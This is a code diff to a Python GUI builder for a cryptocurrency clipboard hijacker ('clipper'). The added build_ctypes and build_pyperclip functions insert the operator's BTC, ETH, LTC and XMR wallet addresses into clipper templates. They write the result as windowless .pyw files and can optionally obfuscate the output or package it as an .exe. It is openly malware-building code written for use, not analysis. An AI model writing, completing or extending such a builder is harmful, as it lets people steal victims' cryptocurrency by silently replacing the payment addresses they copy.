@@ -79,7 +79,7 @@ class build:
         if xmr_addr == "":
             xmr_addr = "SET XMR ADDRESS HERE"
         
-        with open("scripts\\main.pyw", "r") as file:
+        with open("scripts\\subprocess_method.pyw", "r") as file:
             script_content = file.read()
         
         with open("scripts\\temp.pyw", "w") as file:
@@ -119,10 +119,122 @@ class build:
         os.remove("scripts/temp.pyw")
 
     def build_ctypes(single_use, obfuscate, exe_file):
-        print("build_ctypes")
+        if single_use == "on":
+            single_use = True
+        else:
+            single_use = False
+        
+        btc_addr = btc_addr1
+        eth_addr = eth_addr1
+        ltc_addr = ltc_addr1
+        xmr_addr = xmr_addr1
+
+        if btc_addr == "":
+            btc_addr = "SET BTC ADDRESS HERE"
+        if eth_addr == "":
+            eth_addr = "SET ETH ADDRESS HERE"
+        if ltc_addr == "":
+            ltc_addr = "SET LTC ADDRESS HERE"
+        if xmr_addr == "":
+            xmr_addr = "SET XMR ADDRESS HERE"
+        
+        with open("scripts\\ctypes_method.pyw", "r") as file:
+            script_content = file.read()
+        
+        with open("scripts\\temp.pyw", "w") as file:
+            file.write(script_content)
+            file.close()
+        
+        with open("scripts\\temp.pyw", "r") as file:
+            script_content = file.read()
+        
+        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
+        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
+        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
+        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
+        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
+
+        if out_name.get().strip() == "":
+            new_file_name = "ctypes_clipper.pyw"
+
+            with open(os.path.join("output", new_file_name), "w") as new_file:
+                new_file.write(script_content)
+        else:
+            if ".pyw" not in out_name.get().strip():
+                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
+                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
+            else:
+                new_file_name = out_name.get().strip()
+                with open(os.path.join("output", new_file_name), "w") as new_file:
+                    new_file.write(script_content)       
+        
+        if obfuscate == "on":
+            current_path = os.path.join("output", new_file_name)
+            build.obfuscate(current_path, new_file_name)
+        if exe_file == "on":
+            current_path = os.path.join("output", new_file_name)
+            build.exe(current_path, new_file_name)
+
+        os.remove("scripts/temp.pyw")
 
     def build_pyperclip(single_use, obfuscate, exe_file):
-        print("build_pyperclip")
+        if single_use == "on":
+            single_use = True
+        else:
+            single_use = False
+        
+        btc_addr = btc_addr1
+        eth_addr = eth_addr1
+        ltc_addr = ltc_addr1
+        xmr_addr = xmr_addr1
+
+        if btc_addr == "":
+            btc_addr = "SET BTC ADDRESS HERE"
+        if eth_addr == "":
+            eth_addr = "SET ETH ADDRESS HERE"
+        if ltc_addr == "":
+            ltc_addr = "SET LTC ADDRESS HERE"
+        if xmr_addr == "":
+            xmr_addr = "SET XMR ADDRESS HERE"
+        
+        with open("scripts\\pyperclip_method.pyw", "r") as file:
+            script_content = file.read()
+        
+        with open("scripts\\temp.pyw", "w") as file:
+            file.write(script_content)
+            file.close()
+        
+        with open("scripts\\temp.pyw", "r") as file:
+            script_content = file.read()
+        
+        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
+        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
+        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
+        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
+        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
+
+        if out_name.get().strip() == "":
+            new_file_name = "pyperclip_clipper.pyw"
+
+            with open(os.path.join("output", new_file_name), "w") as new_file:
+                new_file.write(script_content)
+        else:
+            if ".pyw" not in out_name.get().strip():
+                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
+                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
+            else:
+                new_file_name = out_name.get().strip()
+                with open(os.path.join("output", new_file_name), "w") as new_file:
+                    new_file.write(script_content)       
+        
+        if obfuscate == "on":
+            current_path = os.path.join("output", new_file_name)
+            build.obfuscate(current_path, new_file_name)
+        if exe_file == "on":
+            current_path = os.path.join("output", new_file_name)
+            build.exe(current_path, new_file_name)
+
+        os.remove("scripts/temp.pyw")
 
     def check_type():
         check_valid_btn.configure(text="to run again set a new config with reset config", state="disabled")
